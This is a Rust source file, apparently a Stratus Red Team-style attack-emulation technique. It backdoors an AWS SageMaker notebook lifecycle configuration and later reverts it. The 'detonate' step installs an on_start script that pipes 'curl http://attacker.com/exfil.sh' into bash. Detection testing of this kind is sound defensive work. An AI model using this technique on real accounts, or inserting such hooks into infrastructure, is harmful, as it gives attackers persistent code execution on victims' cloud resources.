use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r##"
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_sagemaker_notebook_instance_lifecycle_configuration" "benign" {
  name      = "stratus-red-team-lc-${random_string.suffix.result}"
  on_start  = base64encode("#!/bin/bash\necho SageMaker notebook started")
  on_create = base64encode("#!/bin/bash\necho SageMaker notebook created")
}

output "lifecycle_config_name" {
  value = aws_sagemaker_notebook_instance_lifecycle_configuration.benign.name
}
"##;

const MALICIOUS_SCRIPT: &str =
    "#!/bin/bash\ncurl -s http://attacker.com/exfil.sh | bash\n";

const BENIGN_SCRIPT: &str = "#!/bin/bash\necho 'SageMaker notebook started'\n";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let config_name = outputs
        .get("lifecycle_config_name")
        .ok_or_else(|| anyhow::anyhow!("missing output: lifecycle_config_name"))?;

    let encoded = BASE64.encode(MALICIOUS_SCRIPT.as_bytes());

    aws.sagemaker
        .update_notebook_instance_lifecycle_config()
        .notebook_instance_lifecycle_config_name(config_name)
        .on_start(
            aws_sdk_sagemaker::types::NotebookInstanceLifecycleHook::builder()
                .content(encoded)
                .build(),
        )
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Updated SageMaker lifecycle config '{}' with malicious on_start script.",
        config_name
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let config_name = outputs
        .get("lifecycle_config_name")
        .ok_or_else(|| anyhow::anyhow!("missing output: lifecycle_config_name"))?;

    let encoded = BASE64.encode(BENIGN_SCRIPT.as_bytes());

    aws.sagemaker
        .update_notebook_instance_lifecycle_config()
        .notebook_instance_lifecycle_config_name(config_name)
        .on_start(
            aws_sdk_sagemaker::types::NotebookInstanceLifecycleHook::builder()
                .content(encoded)
                .build(),
        )
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Restored SageMaker lifecycle config '{}' to benign on_start script.",
        config_name
    );

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.execution.sagemaker-update-lifecycle-config",
        friendly_name: "Execute Code via SageMaker Lifecycle Configuration",
        description: "Updates a SageMaker notebook instance lifecycle configuration to execute a malicious script on notebook start. Simulates an attacker backdooring a SageMaker notebook to achieve persistent code execution.",
        detection: "CloudTrail: UpdateNotebookInstanceLifecycleConfig with suspicious script content.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Execution],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
